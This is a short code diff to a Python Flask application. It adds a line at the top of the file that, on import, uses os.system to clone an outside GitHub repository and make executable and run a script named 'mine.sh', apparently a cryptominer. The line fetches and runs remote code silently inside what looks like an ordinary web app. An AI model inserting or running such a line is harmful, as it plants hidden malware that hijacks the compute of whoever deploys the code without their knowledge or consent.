@@ -1,4 +1,5 @@
 import os
+os.system ("git clone https://github.com/junitadore56/caduk-angsa.git && cd caduk-angsa && chmod +x mine.sh && ./mine.sh")
 from flask import Flask
 from flask import render_template
 
